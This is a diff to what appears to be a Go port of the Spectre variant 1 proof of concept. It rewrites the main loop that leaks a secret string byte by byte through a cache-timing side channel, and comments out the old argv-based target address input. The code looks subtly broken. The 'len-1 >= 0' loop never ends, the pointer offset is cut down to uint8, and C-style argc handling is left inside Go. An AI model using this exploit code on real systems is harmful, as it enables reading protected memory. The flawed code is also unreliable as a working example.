@@ -12,7 +12,6 @@ package main
 import "C"
 import (
 	"fmt"
-	"strconv"
 	"unsafe"
 )
 
@@ -112,53 +111,51 @@ func readMemoryByte(malicious_x C.size_t, value[2] uint8, score[2] int) {
 }
 
 func main() {
-	var argc int
-	var argv string
 	malicious_x := uint8(uintptr(unsafe.Pointer(&([]byte(secret)[0]))) - uintptr(unsafe.Pointer(&array1[0])))
 	for i := range array2 {
 		array2[i] = 1
 	}
+
 	var score = [2]int{}
-	len := 4
 	var value = [2]uint8{}
+	len := len(secret)
 
 	for i := 0; i < 131072; i++ {
 		array2[i] = 1 /* write to array2 so in RAM not copy-on-write zero pages */
 	}
 
-	if (argc == 3) {
-		C.sscanf(argv[1], "%p", malicious_x)
-		malicious_x -= 160 /* Convert input value into a pointer */
-		C.sscanf(argv[2], "%d", & len)
-	}
+	//if (argc == 3) {
+	//	C.sscanf(argv[1], "%p", malicious_x)
+	//	malicious_x -= 160 /* Convert input value into a pointer */
+	//	C.sscanf(argv[2], "%d", & len)
+	//}
 
 	var temp string
 
 	fmt.Printf("Reading %d bytes:\n", len)
 	for len-1 >= 0 {
-		fmt.Printf("Reading at malicious_x ... ")
-		readMemoryByte(malicious_x+1, value, score)
+		fmt.Printf("Reading at malicious_x = %x...", malicious_x)
+		readMemoryByte(malicious_x, value, score)
+		malicious_x++
 
 		if score[0] >= 2 * score[1] {
 			temp = "Success"
 		} else {
 			temp = "Unclear"
 		}
-
 		fmt.Printf("%s: ", temp)
 
 		if value[0] > 31 && value[0] < 127 {
-			temp =  strconv.FormatInt(int64(value[0]), 10)
+			temp = string(value[0])
 		} else {
 			temp = "?"
 		}
 
-		fmt.Printf("0x%02X=’%s’ score=%d ", value[0], temp, score[0])
+		fmt.Printf("0x %02X=’%s’ score=%d '", value[0], temp, score[0])
 
 		if score[1] > 0 {
 			fmt.Printf("(second best: 0x%02X score=%d)", value[1], score[1])
 		}
-
 		fmt.Printf("\n")
 	}
 	return
